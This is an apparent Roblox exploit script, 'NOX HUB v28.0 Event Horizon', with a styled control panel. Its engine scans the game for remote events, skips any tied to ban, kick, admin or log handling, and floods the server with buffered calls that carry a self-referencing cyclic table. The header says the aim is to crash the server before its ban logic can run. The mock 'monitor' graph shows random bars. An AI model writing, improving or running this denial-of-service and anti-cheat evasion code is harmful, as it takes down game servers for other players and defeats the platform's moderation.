--[[
    🔱 NOX HUB v28.0 [EVENT-HORIZON] 🔱
    "The point of no return. Crash before they catch you."
    
    HORIZON FEATURES:
    - [CYCLIC FUSION] : Combines Lag Switch with Recursive Tables.
    - [SERIALIZATION LOCK] : Forces server to infinite-loop while unpacking data.
    - [BAN EVASION] : Server freezes BEFORE running ban logic.
    - [COMMAND CENTER] : Premium UI retained.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. HORIZON ENGINE //
local Engine = {
    Active = false,
    Targets = {},
    Buffer = {} 
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- ULTRA SAFE FILTER
            if not (n:find("ban") or n:find("kick") or n:find("admin") or n:find("log")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Horizon(duration, updateCallback)
    if Engine.Active then return end
    Engine.Active = true
    Engine.Buffer = {}
    
    Engine:Scan()
    
    -- THE PAYLOAD (CYCLIC BOMB)
    -- This table, when serialized by Roblox, causes massive recursion or errors.
    local Cycle = {}
    Cycle[1] = Cycle
    Cycle[2] = {}
    Cycle[2][1] = Cycle
    local Payload = table.create(10, Cycle) 
    
    task.spawn(function()
        local StartTime = tick()
        local EndTime = StartTime + duration
        
        -- PHASE 1: SILENT ACCUMULATION
        while tick() < EndTime do
            local remaining = math.ceil(EndTime - tick())
            updateCallback(remaining, "CHARGING SINGULARITY... ("..#Engine.Buffer..")")
            
            -- Fill Buffer with Cyclic Calls
            for i = 1, 200 do -- Lower count, HIGHER impact
                local r = Engine.Targets[math.random(1, #Engine.Targets)]
                if r then
                    table.insert(Engine.Buffer, function()
                        pcall(function()
                            if r:IsA("RemoteEvent") then r:FireServer(Payload)
                            else r:InvokeServer(Payload) end
                        end)
                    end)
                end
            end
            RunService.Heartbeat:Wait()
        end
        
        -- PHASE 2: EVENT HORIZON
        updateCallback(0, "EVENT HORIZON REACHED")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="GOODBYE SERVER."})
        
        -- EXECUTE ALL
        -- The hope: The first packet crashes the thread handler. The Anti-Cheat never runs.
        for i = #Engine.Buffer, 1, -1 do
            if Engine.Buffer[i] then
                coroutine.wrap(Engine.Buffer[i])()
            end
             -- No delay. Pure instant flood.
             if i % 5000 == 0 then RunService.Heartbeat:Wait() end 
        end
        
        Engine.Active = false
        Engine.Buffer = {}
        updateCallback(duration, "SYSTEM READY")
    end)
end

-- // 2. COMMAND CENTER UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxCommand"
    pcall(function() Screen.Parent = CoreGui end)
    
    -- MAIN WINDOW
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 350)
    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
    Main.BackgroundColor3 = Color3.fromRGB(15, 10, 15) -- Void Purple/Black
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    
    local Corner = Instance.new("UICorner", Main)
    Corner.CornerRadius = UDim.new(0, 6)
    
    local TopBar = Instance.new("Frame", Main)
    TopBar.Size = UDim2.new(1, 0, 0, 40)
    TopBar.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
    local TopCorner = Instance.new("UICorner", TopBar)
    TopCorner.CornerRadius = UDim.new(0, 6)
    
    local Title = Instance.new("TextLabel", TopBar)
    Title.Text = "NOX EVENT HORIZON v28.0"
    Title.Font = Enum.Font.GothamBold
    Title.TextColor3 = Color3.fromRGB(180, 100, 255)
    Title.TextSize = 14
    Title.Size = UDim2.new(0.5, 0, 1, 0)
    Title.Position = UDim2.new(0.05, 0, 0, 0)
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.BackgroundTransparency = 1
    
    -- TABS
    local Tabs = Instance.new("Frame", Main)
    Tabs.Size = UDim2.new(0.25, 0, 0.85, 0) 
    Tabs.Position = UDim2.new(0, 0, 0.15, 0)
    Tabs.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
    Tabs.BorderSizePixel = 0
    
    local function CreateTabBtn(text, order, callback)
        local btn = Instance.new("TextButton", Tabs)
        btn.Size = UDim2.new(1, 0, 0, 40)
        btn.Position = UDim2.new(0, 0, 0, (order-1)*40)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(150, 100, 150)
        btn.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
        btn.Font = Enum.Font.GothamMedium
        btn.BorderSizePixel = 0
        
        btn.MouseButton1Click:Connect(function()
            for _, c in pairs(Tabs:GetChildren()) do if c:IsA("TextButton") then c.TextColor3 = Color3.fromRGB(150, 100, 150) c.BackgroundColor3 = Color3.fromRGB(20, 15, 25) end end
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.BackgroundColor3 = Color3.fromRGB(40, 20, 50)
            callback()
        end)
        return btn
    end
    
    -- CONTENT AREA
    local Content = Instance.new("Frame", Main)
    Content.Size = UDim2.new(0.75, 0, 0.85, 0)
    Content.Position = UDim2.new(0.25, 0, 0.15, 0)
    Content.BackgroundTransparency = 1
    
    -- PAGE 1: ATTACK
    local PageAttack = Instance.new("Frame", Content)
    PageAttack.Size = UDim2.new(1, 0, 1, 0)
    PageAttack.BackgroundTransparency = 1
    
    local StatusLbl = Instance.new("TextLabel", PageAttack)
    StatusLbl.Text = "READY TO COLLAPSE"
    StatusLbl.Size = UDim2.new(1, 0, 0, 30)
    StatusLbl.Position = UDim2.new(0, 0, 0.1, 0)
    StatusLbl.TextColor3 = Color3.fromRGB(200, 100, 255)
    StatusLbl.Font = Enum.Font.Code
    StatusLbl.BackgroundTransparency = 1
    
    local BufferBarBg = Instance.new("Frame", PageAttack)
    BufferBarBg.Size = UDim2.new(0.8, 0, 0.05, 0)
    BufferBarBg.Position = UDim2.new(0.1, 0, 0.3, 0)
    BufferBarBg.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
    local BarCorner = Instance.new("UICorner", BufferBarBg)
    
    local BufferBarFill = Instance.new("Frame", BufferBarBg)
    BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
    BufferBarFill.BackgroundColor3 = Color3.fromRGB(150, 50, 255)
    local FillCorner = Instance.new("UICorner", BufferBarFill)
    
    local MainBtn = Instance.new("TextButton", PageAttack)
    MainBtn.Size = UDim2.new(0.6, 0, 0.2, 0)
    MainBtn.Position = UDim2.new(0.2, 0, 0.6, 0)
    MainBtn.BackgroundColor3 = Color3.fromRGB(80, 20, 100)
    MainBtn.Text = "INITIATE EVENT HORIZON (15s)"
    MainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    MainBtn.Font = Enum.Font.GothamBold
    local BtnCorner = Instance.new("UICorner", MainBtn)
    
    MainBtn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Horizon(15, function(timeLeft, txt)
                StatusLbl.Text = txt
                local progress = (15 - timeLeft) / 15
                BufferBarFill.Size = UDim2.new(progress, 0, 1, 0)
                
                if timeLeft == 0 then
                   MainBtn.Text = "INITIATE EVENT HORIZON (15s)"
                   BufferBarFill.Size = UDim2.new(0, 0, 1, 0)
                else
                   MainBtn.Text = "CHARGING... " .. timeLeft
                end
            end)
        end
    end)
    
    -- PAGE 2: VISUALS (Fake Graph)
    local PageVisuals = Instance.new("Frame", Content)
    PageVisuals.Size = UDim2.new(1, 0, 1, 0)
    PageVisuals.BackgroundTransparency = 1
    PageVisuals.Visible = false
    
    local GraphFrame = Instance.new("Frame", PageVisuals)
    GraphFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
    GraphFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
    GraphFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 20)
    GraphFrame.BorderColor3 = Color3.fromRGB(60, 40, 80)
    GraphFrame.BorderSizePixel = 1
    
    for i = 1, 20 do
        local bar = Instance.new("Frame", GraphFrame)
        bar.Size = UDim2.new(0.04, 0, math.random()*0.5, 0)
        bar.Position = UDim2.new((i-1)*0.05, 0, 1 - bar.Size.Y.Scale, 0)
        bar.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
        bar.BorderSizePixel = 0
        task.spawn(function()
            while GraphFrame.Parent do
                local targetHeight = Engine.Active and math.random(0.8, 1) or math.random(0.1, 0.3)
                bar:TweenSize(UDim2.new(0.04, 0, targetHeight, 0), "Out", "Quad", 0.5, true)
                wait(0.1 + math.random()*0.2)
            end
        end)
    end

    -- TABS LOGIC
    CreateTabBtn("ATTACK", 1, function() PageAttack.Visible = true; PageVisuals.Visible = false end)
    CreateTabBtn("MONITOR", 2, function() PageAttack.Visible = false; PageVisuals.Visible = true end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
